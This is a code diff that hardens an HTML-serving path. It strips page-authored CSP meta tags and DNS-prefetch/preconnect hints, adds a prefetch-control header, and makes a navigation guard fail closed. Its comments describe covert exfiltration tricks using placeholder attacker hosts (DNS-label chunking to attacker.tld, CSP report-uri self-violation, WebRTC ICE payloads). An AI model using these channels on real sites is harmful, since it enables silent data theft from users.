@@ -63,16 +63,46 @@ import analysisSource from 'virtual:canvas-analysis'
 //     username:'<payload>'}]})` does DNS + UDP during ICE gathering and no
 //     fetch-directive covers it. Chromium's default is allow, so the CSP3
 //     `webrtc 'block'` directive is the only thing that stops it.
-//   - `<link rel=dns-prefetch|preconnect>` — a resolver hint, not a fetch, so
-//     no directive applies. ~63 bytes per DNS label, repeatable. It is stopped
-//     by nothing in CSP; the Permissions-Policy header below and the fact that
-//     a hostile document is only ever reached through a UAT root the user's own
-//     session registered are the mitigations, and it is NOT fully closed —
-//     stated plainly rather than papered over.
+//   - `<link rel=dns-prefetch|preconnect|prefetch|prerender>` — a resolver /
+//     connection hint, not a fetch, so no CSP directive applies. One hostname
+//     per chunk (~63 bytes a label, ≤253 a name) makes it a working channel:
+//     every unique name is a query at the attacker's authoritative resolver.
+//     The comment that stood here named two mitigations and NEITHER held
+//     (adversarial review, 2026-08-16). It cited the Permissions-Policy header
+//     below — which has no feature covering resource hints, as this file itself
+//     admits sixty lines further down — and "only ever reached through a UAT
+//     root the user's own session registered", which is simply false:
+//     `renderVersion({mode:'design'})` serves AGENT-AUTHORED html out of the
+//     version's own directory and registers no root at all, and that is the
+//     agent's ordinary authoring path. What is actually there now:
+//       1. `X-DNS-Prefetch-Control: off` on every response (baseHeaders). This
+//          is the load-bearing half, because it is the only one that reaches a
+//          hint the page's own SCRIPT creates — no serve-time rewrite can see
+//          those. How far it reaches (it governs DNS prefetching; whether
+//          Chromium's preconnect predictor honours it is a separate question)
+//          is a property of the running engine that a jsdom unit test cannot
+//          establish. It needs a real-Chromium confirmation and has not had one.
+//       2. `sanitizeServedHtml` drops those `rel` tokens at serve time, which
+//          covers the parser-time hints — the only kind a static dist page has.
+//     Residual, stated plainly rather than papered over: a script-created hint
+//     is outside the strip and rests entirely on (1).
 //   - a page-authored `<meta http-equiv="Content-Security-Policy" …
 //     report-uri=…>` plus a deliberate self-violation. Violation reports are
-//     not subject to `connect-src`/`form-action`. `stripPageAuthoredCspMeta`
-//     removes the element at serve time so the page cannot declare one at all.
+//     not subject to `connect-src`/`form-action`. `sanitizeServedHtml` removes
+//     the element at serve time.
+//
+//     What that is NOT is the claim this file used to make — that the page
+//     "cannot declare one at all". A scanner is not the parser, and the first
+//     one here disagreed with the WHATWG tokenizer in both directions (it left
+//     a meta standing after `<!-->`, and it spliced meta-shaped TEXT out of a
+//     `<textarea>`). The scan below is now measured against the tokenizer case
+//     by case in tests/unit/main/canvas-content-egress.test.ts. Even so, the
+//     honest floor is the engine's, not the scanner's: a `<meta>` policy can
+//     only INTERSECT the served header policy, never loosen it, and Chromium
+//     ignores `report-uri`/`report-to` delivered by `<meta>`. The failure a
+//     surviving pragma would actually cause is a page declaring
+//     `script-src 'none'` to kill the injected bridge, i.e. canvas_snapshot and
+//     canvas_review failing invisibly.
 //
 // This matters more here than it would for a browser tab: a UAT `contentRoot`
 // can be a whole project directory that the page reads same-origin, and
@@ -123,7 +153,9 @@ const DESIGN_CSP =
  * covers a feature arriving in a later Chromium than the one this shipped on.
  *
  * Note what this does NOT cover: `rel=dns-prefetch`/`preconnect` have no
- * Permissions-Policy feature and no CSP directive. See the CSP note above.
+ * Permissions-Policy feature and no CSP directive — this header was once cited
+ * as their mitigation and it never covered them. They are handled by
+ * `X-DNS-Prefetch-Control: off` plus the serve-time strip. See the CSP note above.
  */
 export const CANVAS_PERMISSIONS_POLICY = [
   'accelerometer',
@@ -209,13 +241,39 @@ function baseHeaders(contentType: string, csp?: string): Record<string, string> 
     // are served from this same handler, and a header that is conditional is a
     // header someone eventually forgets to make conditional correctly.
     'Permissions-Policy': CANVAS_PERMISSIONS_POLICY,
+    // The half of the resource-hint defence that a serve-time markup rewrite
+    // cannot be: it is the only thing that reaches a hint created by the page's
+    // own script (`document.createElement('link')`). Unconditional for the same
+    // reason as the line above, and because a hint can be injected into any
+    // document this handler serves.
+    'X-DNS-Prefetch-Control': 'off',
   }
   if (csp) headers['Content-Security-Policy'] = csp
   return headers
 }
 
 // ---------------------------------------------------------------------------
-// Page-authored <meta http-equiv> pragmas
+// Serve-time markup sanitisation: page-authored CSP pragmas + egress hints
+//
+// This is a scanner, not a parser, and the only defensible way to run one is to
+// walk the same states the WHATWG tokenizer does over the constructs that
+// decide where a tag IS. The first version of this code did not, and an
+// adversarial pass measured it against parse5 (the tokenizer Chromium
+// implements) and broke it in both directions — documents where it left a live
+// element standing, and documents where it deleted bytes the browser keeps as
+// inert TEXT, which corrupts working dist output. Every one of those is a named
+// case in that test file, each stated as a differential against the parser
+// rather than against a reading of the spec.
+//
+// Why the scanner survived that review rather than being replaced by "refuse
+// any document containing a CSP meta", which has no parser differential at all:
+// a CSP `<meta>` is ORDINARY in real dist output. This repo's own built
+// artifact (`out/renderer/index.html`) ships one, `resources/splash/index.html`
+// ships one, and it is the standard recommendation for a statically-hosted SPA
+// because a header never reaches a `file://` document. Refusing would turn a
+// normal `dist/` into a blank UAT pane, i.e. trade a bounded correctness bug
+// (see the CSP note at the top of this file: a meta policy can only tighten)
+// for a guaranteed one.
 // ---------------------------------------------------------------------------
 
 /**
@@ -245,115 +303,314 @@ function decodeAttrCharRefs(value: string): string {
   })
 }
 
+/** The tokenizer's ASCII whitespace, and ONLY it. `/\s/` is a wider set: put a
+ *  U+00A0 between `<meta` and `http-equiv` and the tokenizer reads the whole run
+ *  as ONE TAG NAME — not a `<meta>` element at all — while a scanner using
+ *  `/\s/` sees a meta there and deletes it. */
+function isTagSpace(c: string | undefined): boolean {
+  return c === ' ' || c === '\t' || c === '\n' || c === '\f' || c === '\r'
+}
+
+/** A tag name may only begin with an ASCII letter; `<3` and `<-- x` are TEXT. */
+function isAsciiAlpha(c: string | undefined): boolean {
+  return c !== undefined && ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))
+}
+
+/** End of a tag name / of an attribute name / of an unquoted value. */
+function endsName(c: string | undefined): boolean {
+  return c === undefined || isTagSpace(c) || c === '/' || c === '>'
+}
+
+interface ScannedAttr {
+  /** The value exactly as written between the quotes (or bare). */
+  value: string
+  /** Half-open span of that raw text in the document, for a surgical rewrite. */
+  start: number
+  end: number
+}
+
 interface ScannedTag {
+  /** Lowercased tag name. */
+  name: string
   /** Index one past the tag's closing '>' (or the end of the string). */
   end: number
-  attrs: Map<string, string>
+  attrs: Map<string, ScannedAttr>
 }
 
 /**
  * Read one tag starting at `start` (which must point at its '<'), returning its
- * attributes and where it ends.
+ * name, its attributes and where it ends.
  *
  * Quote-aware, because `[^>]*>` is not: a `report-uri https://x/?a=>b` inside a
  * quoted value ends the match early, and a scanner that stops there disagrees
  * with the browser about where the tag is.
  */
 function scanTag(html: string, start: number): ScannedTag {
-  const attrs = new Map<string, string>()
+  const attrs = new Map<string, ScannedAttr>()
   let i = start + 1
-  // Skip the tag name.
-  while (i < html.length && !/[\s/>]/.test(html[i])) i++
+  if (html[i] === '/') i++ // end tag
+  const nameStart = i
+  while (i < html.length && !endsName(html[i])) i++
+  const name = html.slice(nameStart, i).toLowerCase()
   while (i < html.length) {
-    while (i < html.length && /[\s/]/.test(html[i])) i++
+    while (i < html.length && (isTagSpace(html[i]) || html[i] === '/')) i++
     if (i >= html.length) break
-    if (html[i] === '>') return { end: i + 1, attrs }
-    let name = ''
-    while (i < html.length && !/[\s/>=]/.test(html[i])) name += html[i++]
-    while (i < html.length && /\s/.test(html[i])) i++
-    let value = ''
+    if (html[i] === '>') return { name, end: i + 1, attrs }
+    let attrName = ''
+    while (i < html.length && !endsName(html[i]) && html[i] !== '=') attrName += html[i++]
+    while (i < html.length && isTagSpace(html[i])) i++
+    let start_ = i
+    let end_ = i
     if (html[i] === '=') {
       i++
-      while (i < html.length && /\s/.test(html[i])) i++
+      while (i < html.length && isTagSpace(html[i])) i++
       const quote = html[i]
       if (quote === '"' || quote === "'") {
         i++
-        while (i < html.length && html[i] !== quote) value += html[i++]
+        start_ = i
+        while (i < html.length && html[i] !== quote) i++
+        end_ = i
         i++ // past the closing quote
       } else {
-        while (i < html.length && !/[\s>]/.test(html[i])) value += html[i++]
+        start_ = i
+        while (i < html.length && !isTagSpace(html[i]) && html[i] !== '>') i++
+        end_ = i
       }
     }
-    if (name.length > 0) attrs.set(name.toLowerCase(), value)
+    // DUPLICATE ATTRIBUTES: the tokenizer keeps the FIRST and DROPS the rest
+    // ("if there is already an attribute on the token with the exact same name
+    // … this attribute must be removed"). `Map.set` kept the LAST, so
+    // `<meta http-equiv=content-security-policy http-equiv=charset …>` read as
+    // `charset` here and as the pragma in the browser — the element survived.
+    const key = attrName.toLowerCase()
+    if (key.length > 0 && !attrs.has(key)) attrs.set(key, { value: html.slice(start_, end_), start: start_, end: end_ })
   }
-  return { end: html.length, attrs }
+  return { name, end: html.length, attrs }
 }
 
-/** Case-insensitive check that `html` has `tag` starting at `at`, followed by a
- *  real tag-name boundary (so `<metadata>` is not `<meta>`). */
-function tagAt(html: string, at: number, tag: string): boolean {
-  if (html.slice(at, at + tag.length).toLowerCase() !== tag) return false
-  const next = html[at + tag.length]
-  return next === undefined || /[\s/>]/.test(next)
+/**
+ * Index one past the comment that starts at `lt` (`html[lt]` is the '<' of
+ * `<!--`), following the tokenizer's comment states rather than "the next
+ * `-->`". Three of them are not that:
+ *
+ *   - `<!-->` and `<!--->` close IMMEDIATELY (abrupt-closing-of-empty-comment).
+ *     `indexOf('-->')` swallowed the rest of the document, so a `<meta>` after
+ *     one was never scanned — it is a live element to the browser.
+ *   - `--!>` closes a comment (incorrectly-closed-comment). Same swallow.
+ *   - EOF inside a comment ends it; nothing after it exists.
+ */
+function endOfComment(html: string, lt: number): number {
+  let i = lt + 4 // past '<!--'
+  if (html[i] === '>') return i + 1 // <!-->
+  if (html[i] === '-' && html[i + 1] === '>') return i + 2 // <!--->
+  while (i < html.length) {
+    const dash = html.indexOf('--', i)
+    if (dash < 0) return html.length
+    let j = dash + 2
+    while (html[j] === '-') j++ // comment-end state stays on a run of dashes
+    if (html[j] === '>') return j + 1
+    if (html[j] === '!') {
+      // comment-end-bang: '>' closes, '-' returns to comment-end-dash.
+      if (html[j + 1] === '>') return j + 2
+      i = j + 1
+      continue
+    }
+    if (j >= html.length) return html.length
+    i = j // back to comment state, reconsuming this character
+  }
+  return html.length
+}
+
+/** A bogus comment (`<!DOCTYPE …>`, `<![CDATA[…]]>`, `<?x>`, `</3>`) ends at the
+ *  first '>' — including inside a DOCTYPE's quoted identifier, where the
+ *  tokenizer treats '>' as an abrupt end rather than as data. */
+function endOfBogusComment(html: string, lt: number): number {
+  const gt = html.indexOf('>', lt)
+  return gt < 0 ? html.length : gt + 1
+}
+
+/** Contents are not markup at all (RAWTEXT). */
+const RAW_TEXT_ELEMENTS = new Set(['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes'])
+/** Contents are text with character references (RCDATA) — still not markup, so a
+ *  `<meta …>` written inside one is VISIBLE TEXT the browser shows. Splicing it
+ *  out silently edited the page's own content.
+ *
+ *  Known residual, stated rather than hidden: inside FOREIGN content (`<svg>`,
+ *  MathML) `<title>` is an ordinary element whose children are markup, so a
+ *  pragma there is skipped when the parser would build it. That errs toward
+ *  leaving an element standing, which is the bounded direction — the served
+ *  header is authoritative and a `<meta>` policy can only intersect it. */
+const RCDATA_ELEMENTS = new Set(['textarea', 'title'])
+
+/**
+ * Index of the '<' that opens `</name`'s end tag, or the end of the string.
+ *
+ * The boundary check is the point: `</scriptx` is NOT an end tag (the tokenizer
+ * requires whitespace, '/' or '>' after the name, otherwise the text is flushed
+ * and it stays in script data). A plain `indexOf('</script')` ended the skip
+ * there and resumed scanning markup that is still inside the script.
+ */
+function endOfTextContent(html: string, lower: string, from: number, name: string): number {
+  const needle = `</${name}`
+  let i = from
+  for (;;) {
+    const at = lower.indexOf(needle, i)
+    if (at < 0) return html.length
+    if (endsName(html[at + needle.length])) return at
+    i = at + needle.length
+  }
+}
+
+/** A replacement of `[start, end)` with `text`. Empty text removes the range. */
+interface MarkupEdit {
+  start: number
+  end: number
+  text: string
+}
+
+/**
+ * Walk `html` the way the tokenizer's DATA state does, calling `visit` for every
+ * START TAG that is really one, and applying whatever edits it asks for.
+ *
+ * The regions that are skipped are the ones that decide where a tag is:
+ * comments and bogus comments, RAWTEXT/RCDATA contents, and — this is the one a
+ * naive scanner always misses — THE INSIDE OF A PREVIOUS TAG. `<div
+ * title="<!--">` had its attribute value read as the start of a comment, which
+ * swallowed everything to the next `-->`; and `<div data-x="<meta http-equiv=…>">`
+ * had its attribute gutted, because the scanner found a `<meta` there and
+ * spliced it out. Tags are now consumed whole, so neither is ever visible.
+ *
+ * `<template>` contents are tracked but NOT visited: they parse as elements, in
+ * a fragment that is not in a document, so a pragma there never applies and a
+ * hint there never resolves — removing them was pure corruption of the page's
+ * own markup. (`<noscript>` is deliberately not in that set: whether its
+ * contents are markup depends on scripting being enabled, and treating a live
+ * element as inert is the wrong direction to guess in.)
+ */
+function rewriteMarkup(html: string, visit: (tag: ScannedTag, start: number) => MarkupEdit | null): string {
+  // One lowercased copy for the end-tag searches: doing it per `<script>` would
+  // make a bundle with many script tags quadratic.
+  const lower = html.toLowerCase()
+  const edits: MarkupEdit[] = []
+  let templateDepth = 0
+  let i = 0
+  while (i < html.length) {
+    const lt = html.indexOf('<', i)
+    if (lt < 0) break
+    const next = html[lt + 1]
+    if (next === '!') {
+      i = html.startsWith('<!--', lt) ? endOfComment(html, lt) : endOfBogusComment(html, lt)
+      continue
+    }
+    if (next === '?') {
+      i = endOfBogusComment(html, lt)
+      continue
+    }
+    if (next === '/') {
+      if (!isAsciiAlpha(html[lt + 2])) {
+        i = endOfBogusComment(html, lt)
+        continue
+      }
+      const tag = scanTag(html, lt)
+      if (tag.name === 'template' && templateDepth > 0) templateDepth--
+      i = tag.end
+      continue
+    }
+    if (!isAsciiAlpha(next)) {
+      i = lt + 1 // a bare '<' is text
+      continue
+    }
+    const tag = scanTag(html, lt)
+    if (templateDepth === 0) {
+      const edit = visit(tag, lt)
+      if (edit) edits.push(edit)
+    }
+    if (tag.name === 'template') {
+      // A self-closing flag on `<template>` is ignored in HTML content (parse
+      // error), so this opens one either way.
+      templateDepth++
+      i = tag.end
+    } else if (RAW_TEXT_ELEMENTS.has(tag.name) || RCDATA_ELEMENTS.has(tag.name)) {
+      i = endOfTextContent(html, lower, tag.end, tag.name)
+    } else {
+      i = tag.end
+    }
+  }
+  if (edits.length === 0) return html // the common case allocates nothing
+  let out = ''
+  let copiedFrom = 0
+  for (const edit of edits) {
+    out += html.slice(copiedFrom, edit.start) + edit.text
+    copiedFrom = edit.end
+  }
+  return out + html.slice(copiedFrom)
 }
 
 /** The two pragmas that deliver a policy — and with it a report endpoint. */
 const CSP_PRAGMA_RE = /^content-security-policy(-report-only)?$/
 
 /**
- * Remove page-authored `<meta http-equiv="Content-Security-Policy">` elements
- * before the document is served.
- *
- * WHY (adversarial review 2026-08-15, egress finding #3). A document that
- * declares its own policy with `report-uri https://attacker.tld/…` and then
- * deliberately violates it gets a channel that `connect-src` and `form-action`
- * do not govern, carrying page-chosen data in `blocked-uri`. The element is
- * therefore not something canvas content may author. (Chromium is documented to
- * ignore `report-uri`/`report-to` delivered via `<meta>`; that is a property of
- * one engine's conformance, not a boundary this serving path gets to lean on.)
- *
- * SCRIPT AND COMMENT REGIONS ARE SKIPPED. A blind regex over the whole document
- * would also rewrite the characters `<meta http-equiv=…>` where they appear
- * inside a JavaScript string or an HTML comment — text the browser never parses
- * as a tag — silently corrupting real dist output. The scan tracks the same
- * three regions the tokenizer does (comment, `<script>`, `<style>`) so what is
- * removed is only what would actually have been an element.
+ * `rel` tokens that reach the network WITHOUT being a fetch, so no CSP
+ * fetch-directive governs them. See the egress note at the top of this file.
  */
-export function stripPageAuthoredCspMeta(html: string): string {
-  // One lowercased copy for the closing-tag searches: doing it per `<script>`
-  // would make a bundle with many script tags quadratic.
-  const lower = html.toLowerCase()
-  let out = ''
-  let i = 0
-  let copiedFrom = 0
-  while (i < html.length) {
-    const lt = html.indexOf('<', i)
-    if (lt < 0) break
-    if (html.startsWith('<!--', lt)) {
-      const close = html.indexOf('-->', lt + 4)
-      i = close < 0 ? html.length : close + 3
-      continue
+const EGRESS_HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'prerender'])
+
+/** The whitespace `rel` is split on — a DOMTokenList, so ASCII whitespace. */
+const REL_SPLIT_RE = /[\t\n\f\r ]+/
+
+/** Would the browser see this raw token as one of the hint rels? Decoded first
+ *  (`&#100;ns-prefetch`), and re-split after decoding because a numeric
+ *  reference can itself decode to whitespace. */
+function isEgressHintToken(rawToken: string): boolean {
+  return decodeAttrCharRefs(rawToken)
+    .split(REL_SPLIT_RE)
+    .some((token) => EGRESS_HINT_RELS.has(token.toLowerCase()))
+}
+
+/**
+ * Remove what canvas content may not author: a page-authored CSP pragma, and
+ * the `<link>` resource hints that egress without being a fetch.
+ *
+ * WHY THE PRAGMA (adversarial review 2026-08-15, egress finding #3). A document
+ * that declares its own policy with `report-uri https://attacker.tld/…` and then
+ * deliberately violates it gets a channel that `connect-src` and `form-action`
+ * do not govern, carrying page-chosen data in `blocked-uri`. Chromium ignores
+ * `report-uri`/`report-to` delivered via `<meta>` — that is a property of one
+ * engine's conformance rather than a boundary this path leans on — and a meta
+ * policy can only intersect the served header, so what removal actually buys is
+ * that hostile content cannot declare `script-src 'none'` to kill the injected
+ * bridge and make canvas_snapshot/canvas_review fail invisibly.
+ *
+ * WHY THE HINTS (adversarial review 2026-08-16, finding #2). `<link
+ * rel=dns-prefetch href="//<chunk>.attacker.tld">` is a DNS query per chunk at
+ * the attacker's own resolver, and nothing in CSP covers it. The strip is the
+ * parser-time half; `X-DNS-Prefetch-Control: off` in baseHeaders is the half
+ * that also reaches script-created hints.
+ *
+ * A `rel` carrying other tokens keeps them — only the hint tokens are dropped,
+ * written back from the RAW substrings so nothing can be injected through the
+ * rewrite (a decoded token could contain the quote that ends the attribute).
+ * An element whose `rel` was ONLY hints is removed outright.
+ */
+export function sanitizeServedHtml(html: string): string {
+  return rewriteMarkup(html, (tag, start) => {
+    if (tag.name === 'meta') {
+      const httpEquiv = tag.attrs.get('http-equiv')
+      if (httpEquiv === undefined) return null
+      if (!CSP_PRAGMA_RE.test(decodeAttrCharRefs(httpEquiv.value).trim().toLowerCase())) return null
+      return { start, end: tag.end, text: '' }
     }
-    const raw = (['script', 'style'] as const).find((name) => tagAt(html, lt + 1, name))
-    if (raw) {
-      const { end } = scanTag(html, lt)
-      const close = lower.indexOf(`</${raw}`, end)
-      i = close < 0 ? html.length : close + raw.length + 2
-      continue
+    if (tag.name === 'link') {
+      const rel = tag.attrs.get('rel')
+      if (rel === undefined) return null
+      const tokens = rel.value.split(REL_SPLIT_RE).filter((token) => token.length > 0)
+      const kept = tokens.filter((token) => !isEgressHintToken(token))
+      if (kept.length === tokens.length) return null
+      if (kept.length === 0) return { start, end: tag.end, text: '' }
+      return { start: rel.start, end: rel.end, text: kept.join(' ') }
     }
-    if (!tagAt(html, lt + 1, 'meta')) {
-      i = lt + 1
-      continue
-    }
-    const { end, attrs } = scanTag(html, lt)
-    const httpEquiv = attrs.get('http-equiv')
-    if (httpEquiv !== undefined && CSP_PRAGMA_RE.test(decodeAttrCharRefs(httpEquiv).trim().toLowerCase())) {
-      out += html.slice(copiedFrom, lt)
-      copiedFrom = end
-    }
-    i = end
-  }
-  return copiedFrom === 0 ? html : out + html.slice(copiedFrom)
+    return null
+  })
 }
 
 /** Windows reserved device basenames (CON/NUL/COM1/…) — kept in sync with the
@@ -476,9 +733,9 @@ export function serveFile(
     return null
   }
   if (isHtml) {
-    // Strip BEFORE injecting: the bridge tag is ours and must not be walked by
-    // a scanner that is looking for someone else's markup.
-    const html = injectBridgeTag(stripPageAuthoredCspMeta(data.toString('utf8')))
+    // Sanitise BEFORE injecting: the bridge tag is ours and must not be walked
+    // by a scanner that is looking for someone else's markup.
+    const html = injectBridgeTag(sanitizeServedHtml(data.toString('utf8')))
     return new Response(method === 'HEAD' ? null : html, { status: 200, headers: baseHeaders(contentType, csp) })
   }
   const body = method === 'HEAD' ? null : new Uint8Array(data.buffer, data.byteOffset, data.byteLength)
@@ -708,14 +965,34 @@ export interface FrameNavigationEmitter {
  * frame may already have navigated or been destroyed), and a guard whose only
  * input can be null is a guard with an off switch; the initiator covers that
  * case, and for a self-navigation the two are the same frame anyway.
+ *
+ * WHEN BOTH ARE ABSENT THE ANSWER IS NO (adversarial review, 2026-08-16). The
+ * loop used to fall through to "allowed" when neither source was a string,
+ * which is the one case where the guard knows NOTHING about who is navigating —
+ * exactly when it must not decide in the navigation's favour. The `catch` below
+ * fails closed on a throw, but this was not a throw.
+ *
+ * An EMPTY string is information and stays allowed: it is a frame with no
+ * committed document, i.e. the initial mount of the canvas iframe, and refusing
+ * that would leave the pane permanently blank. `canvasScopeOf` already answers
+ * "not a canvas" for it. The fail-closed case is the absence of any source at
+ * all — null/undefined on both.
  */
 export function installCanvasFrameNavigationGuard(contents: FrameNavigationEmitter): void {
   contents.on('will-frame-navigate', (details) => {
     try {
       if (details.isMainFrame) return
-      const sources = [details.frame?.url, details.initiator?.url]
+      const sources = [details.frame?.url, details.initiator?.url].filter(
+        (source): source is string => typeof source === 'string',
+      )
+      if (sources.length === 0) {
+        details.preventDefault()
+        console.warn(
+          `[ccc-ux] blocked a canvas frame navigation with no identifiable source (to ${details.url})`,
+        )
+        return
+      }
       for (const source of sources) {
-        if (typeof source !== 'string') continue
         if (isCanvasFrameNavigationAllowed(source, details.url)) continue
         details.preventDefault()
         console.warn(
